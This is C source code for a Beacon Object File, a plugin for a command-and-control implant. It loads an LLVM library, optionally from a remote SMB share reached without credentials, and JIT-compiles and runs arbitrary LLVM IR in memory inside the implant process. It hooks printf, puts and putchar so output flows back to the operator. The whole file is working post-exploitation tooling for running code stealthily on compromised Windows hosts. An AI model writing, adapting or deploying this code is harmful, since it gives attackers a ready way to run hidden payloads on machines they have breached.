/*
 * Author: @m3rcer 
 * illi_orc_bof.c — In-process LLVM IR executor (ORC JIT / LLJIT variant)
 *
 *
 * ARG PACKING  (bof_pack "cstr,bytes,cstr,cstr,cstr"):
 *   [0] dllPath  — local path to LLVM-C.dll
 *   [1] irBytes  — raw .ll text or .bc bitcode
 *   [2] fnName   — entry function ("" → "main")
 *   [3] loadLibs — comma-separated extra DLLs to LoadLibraryA before JIT
 *                  e.g. "user32.dll,ole32.dll"  ("" = none)
 *                  Equivalent to ORCJITExec.exe --load=<dll> flag.
 *   [4] irArgs   — space-separated args passed to IR main as argv[]
 *                  e.g. "arg1 arg2"  ("" = none, call as main(0,NULL))
 *                  Equivalent to lli.exe final.ll arg1 arg2
 *
 */

#include <windows.h>
#include <stdint.h>
#include <stddef.h>
#include <stdarg.h>

/*  Beacon API  */
#define CALLBACK_OUTPUT  0x0
#define CALLBACK_ERROR   0x0d

typedef struct {
    char *original;
    char *buffer;
    int   length;
    int   size;
} datap;

DECLSPEC_IMPORT void   BeaconDataParse(datap *parser, char *buffer, int size);
DECLSPEC_IMPORT char  *BeaconDataExtract(datap *parser, int *size);
DECLSPEC_IMPORT void   BeaconPrintf(int type, char *fmt, ...);

/*  Kernel32 imports */
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$LoadLibraryA(LPCSTR);
DECLSPEC_IMPORT HMODULE WINAPI KERNEL32$GetModuleHandleA(LPCSTR);
DECLSPEC_IMPORT FARPROC WINAPI KERNEL32$GetProcAddress(HMODULE, LPCSTR);

/*  LLVM C API opaque types  */
typedef void    *LLVMContextRef;
typedef void    *LLVMModuleRef;
typedef void    *LLVMMemoryBufferRef;
typedef void    *LLVMErrorRef;          /* NULL == success */
typedef uint64_t LLVMOrcJITTargetAddress;
typedef int      LLVMBool;

typedef void *LLVMOrcLLJITRef;
typedef void *LLVMOrcLLJITBuilderRef;
typedef void *LLVMOrcJITDylibRef;
typedef void *LLVMOrcThreadSafeContextRef;
typedef void *LLVMOrcThreadSafeModuleRef;
typedef void *LLVMOrcSymbolStringPoolEntryRef;
typedef void *LLVMOrcMaterializationUnitRef;
typedef void *LLVMOrcDefinitionGeneratorRef;

/* JIT symbol flags */
typedef struct { uint8_t GenericFlags; uint8_t TargetFlags; } LLVMJITSymbolFlags;
#define JIT_EXPORTED_CALLABLE ((uint8_t)(0x01 | 0x04))

typedef struct {
    LLVMOrcJITTargetAddress Address;
    LLVMJITSymbolFlags      Flags;
} LLVMJITEvaluatedSymbol;

typedef struct {
    LLVMOrcSymbolStringPoolEntryRef Name;
    LLVMJITEvaluatedSymbol          Sym;
} LLVMOrcCSymbolMapPair;

/* Optional symbol predicate for the process generator */
typedef LLVMBool (*LLVMOrcSymbolPredicate)(void *Ctx,
                                            LLVMOrcSymbolStringPoolEntryRef Sym);

/*  Function pointer typedefs  */
typedef LLVMMemoryBufferRef         (*pfn_MB)  (const char *, size_t, const char *);
typedef LLVMBool                    (*pfn_PI)  (LLVMContextRef, LLVMMemoryBufferRef,
                                                LLVMModuleRef *, char **);
typedef void                        (*pfn_IT)  (void);
typedef void                        (*pfn_DM)  (char *);

typedef LLVMOrcThreadSafeContextRef (*pfn_CTSC)(void);
typedef LLVMContextRef              (*pfn_GTCC)(LLVMOrcThreadSafeContextRef);
typedef LLVMOrcThreadSafeModuleRef  (*pfn_CTSM)(LLVMModuleRef, LLVMOrcThreadSafeContextRef);
typedef LLVMErrorRef                (*pfn_CJIT)(LLVMOrcLLJITRef *, LLVMOrcLLJITBuilderRef);
typedef LLVMOrcJITDylibRef          (*pfn_GMJD)(LLVMOrcLLJITRef);
typedef LLVMOrcSymbolStringPoolEntryRef (*pfn_MI)(LLVMOrcLLJITRef, const char *);
typedef LLVMOrcMaterializationUnitRef   (*pfn_AS)(LLVMOrcCSymbolMapPair *, size_t);
typedef LLVMErrorRef                (*pfn_JDD) (LLVMOrcJITDylibRef, LLVMOrcMaterializationUnitRef);
typedef LLVMErrorRef                (*pfn_AM)  (LLVMOrcLLJITRef, LLVMOrcJITDylibRef,
                                                LLVMOrcThreadSafeModuleRef);
typedef LLVMErrorRef                (*pfn_LU)  (LLVMOrcLLJITRef, LLVMOrcJITTargetAddress *,
                                                const char *);
typedef LLVMErrorRef                (*pfn_DJ)  (LLVMOrcLLJITRef);
typedef void                        (*pfn_DTC) (LLVMOrcThreadSafeContextRef);
typedef char *                      (*pfn_GEM) (LLVMErrorRef);   /* consumes error */
typedef void                        (*pfn_DEM) (char *);
typedef void                        (*pfn_CE)  (LLVMErrorRef);
typedef LLVMErrorRef                (*pfn_CPG) (LLVMOrcDefinitionGeneratorRef *,
                                                char, LLVMOrcSymbolPredicate, void *);
typedef void                        (*pfn_JAG) (LLVMOrcJITDylibRef, LLVMOrcDefinitionGeneratorRef);

typedef int (*pfn_vsnprintf)(char *, size_t, const char *, va_list);

/*  WNet / MPR import  */
/* NETRESOURCEA laid out manually to avoid linking winnetwk.h */
typedef struct {
    DWORD  dwScope;
    DWORD  dwType;        /* RESOURCETYPE_DISK = 1 */
    DWORD  dwDisplayType;
    DWORD  dwUsage;
    LPSTR  lpLocalName;
    LPSTR  lpRemoteName;
    LPSTR  lpComment;
    LPSTR  lpProvider;
} ILLI_NETRESOURCEA;

typedef DWORD (WINAPI *pfn_WNAC2)(ILLI_NETRESOURCEA *, LPCSTR, LPCSTR, DWORD);

/*  Capture buffer  */
static char          g_cap[0x10000];
static size_t        g_caplen;
static pfn_vsnprintf g_vsn;

static int __cdecl cap_printf(const char *fmt, ...) {
    if (!g_vsn || g_caplen >= sizeof(g_cap) - 1) return 0;
    va_list ap; va_start(ap, fmt);
    int n = g_vsn(g_cap + g_caplen, sizeof(g_cap) - g_caplen, fmt, ap);
    va_end(ap);
    if (n > 0) g_caplen += (size_t)n;
    return n;
}
static int __cdecl cap_puts(const char *s) {
    size_t i = 0;
    while (s && s[i] && g_caplen < sizeof(g_cap) - 2) g_cap[g_caplen++] = s[i++];
    g_cap[g_caplen++] = '\n';
    return (int)i + 1;
}
static int __cdecl cap_putchar(int c) {
    if (g_caplen < sizeof(g_cap) - 1) g_cap[g_caplen++] = (char)c;
    return c;
}

/*  Helpers */
static FARPROC sym(HMODULE h, const char *name) {
    FARPROC f = KERNEL32$GetProcAddress(h, name);
    if (!f) BeaconPrintf(CALLBACK_ERROR, "[illi_orc] missing: %s\n", name);
    return f;
}

/* Returns 1 on error (error is consumed). */
static int orc_fail(LLVMErrorRef err, const char *ctx, pfn_GEM fn_GEM, pfn_DEM fn_DEM) {
    if (!err) return 0;
    char *msg = fn_GEM ? fn_GEM(err) : NULL; /* fn_GEM consumes err */
    BeaconPrintf(CALLBACK_ERROR, "[illi_orc] %s: %s\n", ctx, msg ? msg : "(null)");
    if (msg && fn_DEM) fn_DEM(msg);
    return 1;
}

/*
 * unc_share_copy — extract \\server\share from a UNC path into out[].
 */
static void unc_share_copy(const char *path, char *out, size_t outlen) {
    size_t i = 2;                       /* skip leading \\ */
    while (path[i] && path[i] != '\\') i++;   /* skip server name */
    if (path[i] == '\\') i++;           /* skip backslash before share */
    while (path[i] && path[i] != '\\') i++;   /* skip share name */
    /* i now points at 4th backslash (or end of string) */
    if (i >= outlen) i = outlen - 1;
    for (size_t j = 0; j < i && j < outlen - 1; j++) out[j] = path[j];
    out[i < outlen ? i : outlen - 1] = '\0';
}

/*
 * smb_preauth — call WNetAddConnection2A(\\server\share) before LoadLibraryA.
 */
static void smb_preauth(const char *dllPath) {
    char share[256];
    __builtin_memset(share, 0, sizeof(share));
    unc_share_copy(dllPath, share, sizeof(share));

    if (!share[0]) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[illi_orc] smb_preauth: could not extract share from %s\n", dllPath);
        return;
    }

    HMODULE hMpr = KERNEL32$LoadLibraryA("mpr.dll");
    if (!hMpr) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[illi_orc] smb_preauth: mpr.dll not loaded — UNC may fail on Win10+\n");
        return;
    }

    pfn_WNAC2 fn_WNAC2 = (pfn_WNAC2)KERNEL32$GetProcAddress(hMpr, "WNetAddConnection2A");
    if (!fn_WNAC2) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[illi_orc] smb_preauth: WNetAddConnection2A not found in mpr.dll\n");
        return;
    }

    ILLI_NETRESOURCEA nr;
    __builtin_memset(&nr, 0, sizeof(nr));
    nr.dwType      = 1;       /* RESOURCETYPE_DISK */
    nr.lpRemoteName = share;

    /*
     * lpPassword = NULL, lpUserName = NULL:
     */
    DWORD ret = fn_WNAC2(&nr, NULL, NULL, 0);

    if (ret == 0 || ret == 85 /*ERROR_ALREADY_ASSIGNED*/) {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[illi_orc] smb_preauth: connected to %s (ret=%lu)\n",
            share, (unsigned long)ret);
    } else {
        BeaconPrintf(CALLBACK_OUTPUT,
            "[illi_orc] smb_preauth: WNetAddConnection2A(%s) ret=%lu — attempting LoadLibrary anyway\n",
            share, (unsigned long)ret);
    }
    /* mpr.dll stays loaded; freeing it would disconnect the share. */
}

/*
 * load_extra_dlls — parse a comma-separated DLL list and LoadLibraryA each one.
 */
static void load_extra_dlls(const char *libs) {
    if (!libs || libs[0] == '\0') return;

    char name[MAX_PATH];
    size_t i = 0, start = 0;

    for (;;) {
        char c = libs[i];
        if (c == ',' || c == '\0') {
            size_t len = i - start;
            /* skip empty tokens (double comma) */
            if (len > 0 && len < sizeof(name) - 1) {
                size_t j;
                for (j = 0; j < len; j++) name[j] = libs[start + j];
                name[len] = '\0';
                HMODULE h = KERNEL32$LoadLibraryA(name);
                if (h)
                    BeaconPrintf(CALLBACK_OUTPUT,
                        "[illi_orc] --load: loaded %s\n", name);
                else
                    BeaconPrintf(CALLBACK_OUTPUT,
                        "[illi_orc] --load: FAILED to load %s\n", name);
            }
            start = i + 1;
        }
        if (c == '\0') break;
        i++;
    }
}

/*  BOF entry point  */
void go(char *args, int argslen) {

    g_caplen = 0; g_vsn = NULL;

    datap parser;
    BeaconDataParse(&parser, args, argslen);

    int dllLen=0, irLen=0, fnLen=0, loadLen=0, irArgsLen=0;
    char *dllPath  = BeaconDataExtract(&parser, &dllLen);
    char *irBytes  = BeaconDataExtract(&parser, &irLen);
    char *fnName   = BeaconDataExtract(&parser, &fnLen);
    char *loadLibs = BeaconDataExtract(&parser, &loadLen);   /* may be NULL / empty */
    char *irArgs   = BeaconDataExtract(&parser, &irArgsLen); /* may be NULL / empty */

    if (!dllPath || !irBytes || irLen == 0) {
        BeaconPrintf(CALLBACK_ERROR, "[illi_orc] bad args\n"); return;
    }
    if (!fnName || fnLen == 0 || fnName[0] == '\0') fnName = "main";
    if (!irArgs) irArgs = "";

    BeaconPrintf(CALLBACK_OUTPUT,
        "[illi_orc] loading %s  IR=%d bytes  fn=%s\n", dllPath, irLen, fnName);

    /*  SMB pre-auth  */
    if (dllPath[0] == '\\' && dllPath[1] == '\\') {
        smb_preauth(dllPath);
    }

    /*  Load LLVM-C.dll   */
    HMODULE hLLVM = KERNEL32$LoadLibraryA(dllPath);
    if (!hLLVM) {
        BeaconPrintf(CALLBACK_ERROR,
            "[illi_orc] LoadLibrary failed: %s\n", dllPath);
        return;
    }

    /*  Load extra DLLs requested by --load   */
    load_extra_dlls(loadLibs);

    /* vsnprintf  */
    { HMODULE h = KERNEL32$GetModuleHandleA("ntdll.dll");
      if (h) g_vsn = (pfn_vsnprintf)KERNEL32$GetProcAddress(h, "_vsnprintf"); }
    if (!g_vsn) {
        HMODULE h = KERNEL32$GetModuleHandleA("ucrtbase.dll");
        if (!h) h = KERNEL32$GetModuleHandleA("msvcrt.dll");
        if (h) g_vsn = (pfn_vsnprintf)KERNEL32$GetProcAddress(h, "vsnprintf");
    }
    if (!g_vsn) BeaconPrintf(CALLBACK_OUTPUT,
        "[illi_orc] warn: no vsnprintf — %%s/%%d captures will be empty\n");

    /* Resolve ORC C API from LLVM-C.dll */
    pfn_MB   fn_MB   = (pfn_MB)  sym(hLLVM, "LLVMCreateMemoryBufferWithMemoryRangeCopy");
    pfn_PI   fn_PI   = (pfn_PI)  sym(hLLVM, "LLVMParseIRInContext");
    pfn_IT   fn_I86i = (pfn_IT)  sym(hLLVM, "LLVMInitializeX86TargetInfo");
    pfn_IT   fn_I86  = (pfn_IT)  sym(hLLVM, "LLVMInitializeX86Target");
    pfn_IT   fn_I86m = (pfn_IT)  sym(hLLVM, "LLVMInitializeX86TargetMC");
    pfn_IT   fn_I86a = (pfn_IT)  sym(hLLVM, "LLVMInitializeX86AsmPrinter");
    pfn_DM   fn_DM   = (pfn_DM)  sym(hLLVM, "LLVMDisposeMessage");
    pfn_CTSC fn_CTSC = (pfn_CTSC)sym(hLLVM, "LLVMOrcCreateNewThreadSafeContext");
    pfn_GTCC fn_GTCC = (pfn_GTCC)sym(hLLVM, "LLVMOrcThreadSafeContextGetContext");
    pfn_CTSM fn_CTSM = (pfn_CTSM)sym(hLLVM, "LLVMOrcCreateNewThreadSafeModule");
    pfn_CJIT fn_CJIT = (pfn_CJIT)sym(hLLVM, "LLVMOrcCreateLLJIT");
    pfn_GMJD fn_GMJD = (pfn_GMJD)sym(hLLVM, "LLVMOrcLLJITGetMainJITDylib");
    pfn_MI   fn_MI   = (pfn_MI)  sym(hLLVM, "LLVMOrcLLJITMangleAndIntern");
    pfn_AS   fn_AS   = (pfn_AS)  sym(hLLVM, "LLVMOrcAbsoluteSymbols");
    pfn_JDD  fn_JDD  = (pfn_JDD) sym(hLLVM, "LLVMOrcJITDylibDefine");
    pfn_AM   fn_AM   = (pfn_AM)  sym(hLLVM, "LLVMOrcLLJITAddLLVMIRModule");
    pfn_LU   fn_LU   = (pfn_LU)  sym(hLLVM, "LLVMOrcLLJITLookup");
    pfn_DJ   fn_DJ   = (pfn_DJ)  sym(hLLVM, "LLVMOrcDisposeLLJIT");
    pfn_DTC  fn_DTC  = (pfn_DTC) sym(hLLVM, "LLVMOrcDisposeThreadSafeContext");
    pfn_GEM  fn_GEM  = (pfn_GEM) sym(hLLVM, "LLVMGetErrorMessage");
    pfn_DEM  fn_DEM  = (pfn_DEM) sym(hLLVM, "LLVMDisposeErrorMessage");
    pfn_CE   fn_CE   = (pfn_CE)  sym(hLLVM, "LLVMConsumeError");
    pfn_CPG  fn_CPG  = (pfn_CPG) sym(hLLVM, "LLVMOrcCreateDynamicLibrarySearchGeneratorForProcess");
    pfn_JAG  fn_JAG  = (pfn_JAG) sym(hLLVM, "LLVMOrcJITDylibAddGenerator");

    if (!fn_MB||!fn_PI||!fn_I86i||!fn_I86||!fn_I86m||!fn_I86a||!fn_DM||
        !fn_CTSC||!fn_GTCC||!fn_CTSM||!fn_CJIT||!fn_GMJD||!fn_MI||
        !fn_AS||!fn_JDD||!fn_AM||!fn_LU||!fn_DJ||!fn_DTC||
        !fn_GEM||!fn_DEM||!fn_CE||!fn_CPG||!fn_JAG) {
        BeaconPrintf(CALLBACK_ERROR, "[illi_orc] symbol resolution failed\n"); return;
    }

    fn_I86i(); fn_I86(); fn_I86m(); fn_I86a();

    /* Parse IR */
    LLVMOrcThreadSafeContextRef tsctx = fn_CTSC();
    LLVMContextRef ctx   = fn_GTCC(tsctx);
    LLVMMemoryBufferRef buf = fn_MB(irBytes, (size_t)irLen, "illi_orc");
    LLVMModuleRef mod = NULL; char *errMsg = NULL;

    if (fn_PI(ctx, buf, &mod, &errMsg) != 0) {
        BeaconPrintf(CALLBACK_ERROR, "[illi_orc] parse IR failed: %s\n",
                     errMsg ? errMsg : "(null)");
        if (errMsg) fn_DM(errMsg);
        fn_DTC(tsctx); return;
    }

    /* mod is now owned by tsmod */
    LLVMOrcThreadSafeModuleRef tsmod = fn_CTSM(mod, tsctx);

    /* Create LLJIT */
    LLVMOrcLLJITRef jit = NULL;
    if (orc_fail(fn_CJIT(&jit, NULL), "CreateLLJIT", fn_GEM, fn_DEM)) {
        fn_DTC(tsctx); return;
    }

    LLVMOrcJITDylibRef JD = fn_GMJD(jit);

    /* Register capture functions as absolute symbols — consulted before process table */
    LLVMOrcCSymbolMapPair syms[3];
    __builtin_memset(syms, 0, sizeof(syms));

    syms[0].Name              = fn_MI(jit, "printf");
    syms[0].Sym.Address       = (LLVMOrcJITTargetAddress)(uintptr_t)cap_printf;
    syms[0].Sym.Flags.GenericFlags = JIT_EXPORTED_CALLABLE;

    syms[1].Name              = fn_MI(jit, "puts");
    syms[1].Sym.Address       = (LLVMOrcJITTargetAddress)(uintptr_t)cap_puts;
    syms[1].Sym.Flags.GenericFlags = JIT_EXPORTED_CALLABLE;

    syms[2].Name              = fn_MI(jit, "putchar");
    syms[2].Sym.Address       = (LLVMOrcJITTargetAddress)(uintptr_t)cap_putchar;
    syms[2].Sym.Flags.GenericFlags = JIT_EXPORTED_CALLABLE;

    /* AbsoluteSymbols takes ownership of the MU; JDDefine takes ownership of the MU */
    if (orc_fail(fn_JDD(JD, fn_AS(syms, 3)), "JITDylibDefine", fn_GEM, fn_DEM)) {
        fn_DJ(jit); fn_DTC(tsctx); return;
    }

    /* Add process symbol generator for everything else (malloc, time, etc.) */
    {
        LLVMOrcDefinitionGeneratorRef gen = NULL;
        LLVMErrorRef e = fn_CPG(&gen, '\0', NULL, NULL);
        if (e) { fn_CE(e); /* non-fatal */ }
        else if (gen) fn_JAG(JD, gen);
    }

    /* Add IR module */
    if (orc_fail(fn_AM(jit, JD, tsmod), "AddLLVMIRModule", fn_GEM, fn_DEM)) {
        fn_DJ(jit); fn_DTC(tsctx); return;
    }

    /* Look up entry function (triggers JIT compilation) */
    LLVMOrcJITTargetAddress fnAddr = 0;
    if (orc_fail(fn_LU(jit, &fnAddr, fnName), "LLJITLookup", fn_GEM, fn_DEM)
        || fnAddr == 0) {
        BeaconPrintf(CALLBACK_ERROR,
            "[illi_orc] function '%s' not found in IR\n", fnName);
        fn_DJ(jit); fn_DTC(tsctx); return;
    }

    BeaconPrintf(CALLBACK_OUTPUT,
        "[illi_orc] JIT compiled '%s' → 0x%llx  calling...\n",
        fnName, (unsigned long long)fnAddr);

    /*  Build argc/argv from space-separated irArgs string
     * argv[0] is always "illi" (program name, per C convention).
     * User-provided ir_args are split on spaces from argv[1] onward.
     * Max 63 user tokens, 4095 chars total.
     *
     *   ir_args=""            → argc=1  argv={"illi",NULL}
     *   ir_args="msg title"   → argc=3  argv={"illi","msg","title",NULL}
     */
    static const char s_argv0[] = "illi";
    static char       s_argv_buf[4096];
    static char      *s_argv_ptrs[65];   /* [0]=argv0, [1..64]=user args */

    s_argv_ptrs[0] = (char *)s_argv0;
    int    call_argc = 1;
    size_t bi = 0;

    if (irArgs && irArgs[0] != '\0') {
        size_t ai = 0;
        int in_tok = 0;
        size_t irlen = (size_t)irArgsLen;

        for (ai = 0; ai <= irlen && bi < sizeof(s_argv_buf) - 1; ai++) {
            char c = (ai < irlen) ? irArgs[ai] : '\0';
            if (c == ' ' || c == '\0') {
                if (in_tok) {
                    s_argv_buf[bi++] = '\0';
                    in_tok = 0;
                }
            } else {
                if (!in_tok) {
                    if (call_argc < 64)
                        s_argv_ptrs[call_argc++] = s_argv_buf + bi;
                    in_tok = 1;
                }
                s_argv_buf[bi++] = c;
            }
        }
    }
    s_argv_ptrs[call_argc] = NULL;
    char **call_argv = s_argv_ptrs;

    if (call_argc > 1)
        BeaconPrintf(CALLBACK_OUTPUT,
            "[illi_orc] passing argc=%d  argv[1]=%s\n",
            call_argc, s_argv_ptrs[1]);

    typedef int (*GenFn)(int, char **);
    int ret = ((GenFn)(uintptr_t)fnAddr)(call_argc, call_argv);

    if (g_caplen > 0) {
        g_cap[g_caplen] = '\0';
        BeaconPrintf(CALLBACK_OUTPUT, "%s", g_cap);
    }

    BeaconPrintf(CALLBACK_OUTPUT, "[illi_orc] '%s' returned %d\n", fnName, ret);

    /* Do NOT DisposeLLJIT / DisposeThreadSafeContext if IR spawned threads */
}
